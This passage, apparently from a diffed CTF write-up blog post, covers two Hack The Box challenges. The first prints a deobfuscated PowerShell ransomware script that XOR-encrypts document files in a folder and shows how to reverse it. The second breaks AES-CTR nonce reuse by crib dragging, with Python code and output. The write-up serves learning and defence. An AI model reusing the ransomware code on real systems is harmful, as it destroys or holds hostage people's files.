+    </span><span class="kr">param</span><span class="p">([</span><span class="n">string</span><span class="p">]</span><span class="nv">$arg</span><span class="p">)</span><span class="w">
+    </span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$arg</span><span class="p">))</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="nv">$key0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64_decode</span><span class="w"> </span><span class="nv">$key0_encoded</span><span class="w">
+</span><span class="nv">$key1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64_decode</span><span class="w"> </span><span class="nv">$key1_encoded</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">extensions_list</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">return</span><span class="w"> </span><span class="p">(</span><span class="n">base64_decode</span><span class="w"> </span><span class="nv">$extensions_encoded</span><span class="p">)</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">xor_encrypt</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="bp">$input</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$key0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$key1</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]::</span><span class="n">new</span><span class="p">(</span><span class="bp">$input</span><span class="o">.</span><span class="nf">Length</span><span class="p">)</span><span class="w">
+    </span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="bp">$input</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nv">$a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$key0</span><span class="p">[</span><span class="nv">$x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nv">$key0</span><span class="o">.</span><span class="nf">Length</span><span class="p">]</span><span class="w">
+        </span><span class="nv">$b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$key1</span><span class="p">[</span><span class="nv">$x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nv">$key1</span><span class="o">.</span><span class="nf">Length</span><span class="p">]</span><span class="w">
+        </span><span class="nv">$result</span><span class="p">[</span><span class="nv">$x</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$input</span><span class="p">[</span><span class="nv">$x</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="nv">$a</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="nv">$b</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$result</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">do_encryption</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="bp">$input</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$key0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$key1</span><span class="p">)</span><span class="w">
+
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="bp">$input</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="bp">$null</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$input</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">return</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+    </span><span class="nv">$key0_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$key0</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$key1_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$key1</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$encrypted_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xor_encrypt</span><span class="w"> </span><span class="bp">$input</span><span class="w"> </span><span class="nv">$key0_bytes</span><span class="w"> </span><span class="nv">$key1_bytes</span><span class="w">
+
+    </span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$encrypted_bytes</span><span class="p">)</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">do_ransomware</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">([</span><span class="n">switch</span><span class="p">]</span><span class="nv">$do_it</span><span class="p">)</span><span class="w">
+    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$do_it</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$ext</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">extensions_list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nv">$target_folder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"dca01aq2/"</span><span class="w">
+                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$target_folder</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+                    </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$target_folder</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w"> </span><span class="o">|</span><span class="w">
+                        </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Extension</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"^\.</span><span class="nv">$ext</span><span class="s2">$"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
+                        </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+                            </span><span class="nv">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="w">
+                            </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$file</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+                                </span><span class="nv">$original_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="w">
+                                </span><span class="nv">$encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">do_encryption</span><span class="w"> </span><span class="nv">$original_bytes</span><span class="w"> </span><span class="nv">$key0</span><span class="w"> </span><span class="nv">$key1</span><span class="w">
+                                </span><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">WriteAllText</span><span class="p">(</span><span class="s2">"</span><span class="nv">$file</span><span class="s2">.secured"</span><span class="p">,</span><span class="w"> </span><span class="nv">$encrypted</span><span class="p">)</span><span class="w">
+                                </span><span class="c"># Remove-Item $file -Force</span><span class="w">
+                            </span><span class="p">}</span><span class="w">
+                        </span><span class="p">}</span><span class="w">
+                </span><span class="p">}</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="n">do_ransomware</span><span class="w"> </span><span class="nt">-do_it</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And the TLDR is:</p>
+<ul>
+  <li>Grab all <code class="language-plaintext highlighter-rouge">.txt</code>, <code class="language-plaintext highlighter-rouge">.doc</code>, <code class="language-plaintext highlighter-rouge">.docx</code> and <code class="language-plaintext highlighter-rouge">.pdf</code> files inside folder <code class="language-plaintext highlighter-rouge">dca01aq2/</code></li>
+  <li>XOR-encrypt each byte of those files with pieces of two keys</li>
+  <li>Base64-encode the result and write it to a file with an added <code class="language-plaintext highlighter-rouge">.secured</code> extension</li>
+  <li>Delete the original file</li>
+</ul>
+
+<h3 id="decryption">Decryption</h3>
+
+<p>Fortunately, we have the two encryption keys embedded in the script itself, and all it takes to reverse XOR encryption is to XOR the cyphertext back with the same key.
+We can even reuse the same powershell script for that purpose:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">base64</span> <span class="nt">-d</span> map.pdf.secured <span class="o">&gt;</span> map.pdf.decoded         <span class="c"># base64-decode the .secured file</span>
+<span class="nv">$ </span><span class="nb">mkdir </span>dca01aq2/                                     <span class="c"># make sure dca01aq2/ folder exists</span>
+<span class="nv">$ </span><span class="nb">cp </span>map.pdf.decoded dca01aq2/map.pdf                 <span class="c"># rename encrypted file with .pdf extension</span>
+<span class="nv">$ </span>pwsh ./obfuscated.ps1                               <span class="c"># run the same script to reverse encryption + base64-encode</span>
+<span class="nv">$ </span><span class="nb">base64</span> <span class="nt">-d</span> dca01aq2/map.pdf.secured <span class="o">&gt;</span> decrypted.bin  <span class="c"># base64 decode to recover original file</span>
+</code></pre></div></div>
+
+<p>We can verify that the decrypted file really is a PDF, then view it to get the flag:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-decrypt.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-decrypt.png" alt="reversing the encryption" /></a></figure>
+
+<h2 id="crypto---traces">Crypto - Traces</h2>
+
+<blockquote>
+  <p>Long ago, a sacred message was sealed away, its meaning obscured by the overlapping echoes of its own magic.
+The careless work of an enchanter has left behind a flaw - a weakness hidden within repetition.
+With keen eyes and sharper wits, can you untangle the whispers of the past and restore the lost words?</p>
+</blockquote>
+
+<p>In this challenge, we’re given an instance of a server running on a certain IP+port, and part of the Python code running on that server.
+You can find a verbatim copy of <code class="language-plaintext highlighter-rouge">server.py</code> <a href="https://gist.github.com/baioc/a12b822b27914de54abd3189b967bab4">here</a>.</p>
+
+<h3 id="server-interaction">Server Interaction</h3>
+
+<p>We’re able to to connect to the server using netcat, and try out a few commands:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/traces-irc.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/traces-irc.png" alt="trying out the server" /></a></figure>
+
+<p>A few things we noticed:</p>
+<ul>
+  <li>We can see past messages, but they are encrypted</li>
+  <li>Even in encrypted messages, usernames and timestamps are stored in plain text</li>
+  <li>Among encrypted messages, we have repeated cypher texts</li>
+</ul>
+
+<h3 id="local-reproduction">Local Reproduction</h3>
+
+<p>The source code can’t be executed out of the box since we’re missing a <code class="language-plaintext highlighter-rouge">db</code> module, but it’s easy enought to provide some local variables as a substitute.
+Furthermore, the code never saves new messages, and merely decrypts old ones when we join a chat room.
+That’s also easy to fix, and we can then start playing with it locally:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/traces-local.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/traces-local.png" alt="patching the source to run it locally" /></a></figure>
+
+<p>We can now confirm that equal messages are encrypted to the same cypher text.
+Looking back at the challenge description, it seems we can explore this “weakness hidden within repetition”.</p>
+
+<h3 id="cryptoanalysis">Cryptoanalysis</h3>
+
+<p>Looking at the source, we see that encryption is done with:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">encrypted_message</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CTR</span><span class="p">,</span> <span class="n">counter</span><span class="o">=</span><span class="n">Counter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="mi">128</span><span class="p">)).</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>And, knowing <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)">how AES-CTR works</a>, we can assume that the same nonce is being reused when encrypting each message.
+We can validate that by grabbing one of the last few encrypted messages and XORing with the plain text <code class="language-plaintext highlighter-rouge">!leave</code>, assuming that’s what the previous users typed in chat.
+Then, we XOR that result with the beginning of every other message:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">):</span>
+<span class="p">...</span>    <span class="k">return</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">))</span>
+<span class="o">&gt;&gt;&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">msgs</span> <span class="o">=</span> <span class="p">[</span>
+<span class="p">...</span>    <span class="sh">"</span><span class="s">a9810fdc6aac809930ad4152c7d5</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">...</span>    <span class="sh">"</span><span class="s">a9810fdc6aac978230b24a51c8dcd7</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">...</span>    <span class="sh">"</span><span class="s">a9810fdc6aac968331a5455fc0d5da21</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">...</span>    <span class="c1"># ...
+</span><span class="p">...</span>    <span class="sh">"</span><span class="s">a98303de77e9</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">...</span>    <span class="sh">"</span><span class="s">a98303de77e9</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">...</span>    <span class="sh">"</span><span class="s">a98303de77e9</span><span class="sh">"</span><span class="p">,</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="p">]</span>
+<span class="o">&gt;&gt;&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">C</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msgs</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">M</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">!leave</span><span class="sh">"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">X</span> <span class="o">=</span> <span class="nf">xor</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="n">C</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">msg</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">msgs</span><span class="p">):</span>
+<span class="p">...</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">decrypt[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">]:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">xor</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msg</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>And we get:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">decrypt</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!nick </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!nick </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!nick </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">We</span><span class="se">\'</span><span class="s">ve </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Unders</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Not ye</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">This c</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Here i</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Got it</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Yes. O</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">I</span><span class="se">\'</span><span class="s">m ch</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Keep m</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">12</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">I</span><span class="se">\'</span><span class="s">ll c</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">13</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">If eve</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">14</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Hold o</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">15</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">We can</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">16</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Agreed</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">17</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Unders</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">18</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!leave</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">19</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!leave</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">[</span><span class="mi">20</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!leave</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Yes!
+Now, even without having the original encryption key (like we had in the previous challenge), we can decrypt the first few characters of all messages.</p>
+
+<h3 id="known-plaintext-attack">Known-Plaintext Attack</h3>
+
+<p>In order to decrypt the rest, we have to repeat the following process:</p>
+<ol>
+  <li>Look at what we have decrypted so far</li>
+  <li>Guess what the next few characters/words are, in any of these messages</li>
+  <li>XOR that (assumed) known-plaintext with the corresponding bytes on the cypher text</li>
+  <li>Use the result of the previous step to decrypt the next few bytes on all messages</li>
+  <li>Check that the results makes sense</li>
+  <li>Repeat from step 1, but now we have decrypted a few more bytes</li>
+</ol>
+
+<p>(PS: this is a <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a> called <a href="https://crypto.stackexchange.com/a/10163">“crib dragging”</a>)</p>
+
+<p>For example: looking at the first 3 messages, we know that’s the users joining the chat room.
+Since we know their usernames, we know that the longest of these 3 messages corresponds to <code class="language-plaintext highlighter-rouge">!nick Runeblight</code>.
+So we want the script to XOR <code class="language-plaintext highlighter-rouge">"!nick Runeblight"</code> with <code class="language-plaintext highlighter-rouge">msgs[2]</code>, and use the result of that to decrypt <code class="language-plaintext highlighter-rouge">len("!nick Runeblight")</code> bytes in all messages.</p>
+
+<p>Here’s what I ended up with:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">))</span>
+
+<span class="n">msgs</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="sh">"</span><span class="s">a9810fdc6aac809930ad4152c7d5</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">a9810fdc6aac978230b24a51c8dcd7</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">a9810fdc6aac968331a5455fc0d5da21</span><span class="sh">"</span><span class="p">,</span>
+    <span class="c1"># ...
+</span>    <span class="sh">"</span><span class="s">a98303de77e9</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">a98303de77e9</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">a98303de77e9</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">]</span>
+
+<span class="n">C</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msgs</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">M</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">!leave</span><span class="sh">"</span>
+<span class="n">X</span> <span class="o">=</span> <span class="nf">xor</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="n">C</span><span class="p">)</span>
+
+<span class="n">texts</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">"</span><span class="s">Runeblight</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sh">"</span><span class="s">phrase</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="sh">"</span><span class="s">range </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sh">"</span><span class="s">ch </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="sh">"</span><span class="s">th </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sh">"</span><span class="s">ate </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sh">"</span><span class="s">usted </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="sh">"</span><span class="s">annel </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sh">"</span><span class="s">ight</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sh">"</span><span class="s">ast</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sh">"</span><span class="s">careful</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sh">"</span><span class="s">vate </span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="sh">"</span><span class="s"> reach</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sh">"</span><span class="s">gs</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sh">"</span><span class="s">ve</span><span class="sh">"</span><span class="p">),</span>
+<span class="p">]</span>
+<span class="k">for</span> <span class="n">cypher_index</span><span class="p">,</span> <span class="n">plain</span> <span class="ow">in</span> <span class="n">texts</span><span class="p">:</span>
+    <span class="n">C</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msgs</span><span class="p">[</span><span class="n">cypher_index</span><span class="p">])</span>
+    <span class="n">C</span> <span class="o">=</span> <span class="n">C</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">X</span><span class="p">):]</span>
+    <span class="n">M</span> <span class="o">=</span> <span class="n">plain</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="n">X</span> <span class="o">+=</span> <span class="nf">xor</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="n">C</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">msg</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">msgs</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">decrypt[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">]:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">xor</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msg</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>And thus we’re able to decrypt everything in the first channel, until we find the password for the secret chat room:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">decrypt</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">!nick Doomfang</span><span class="sh">'</span><span class="p">)</span>
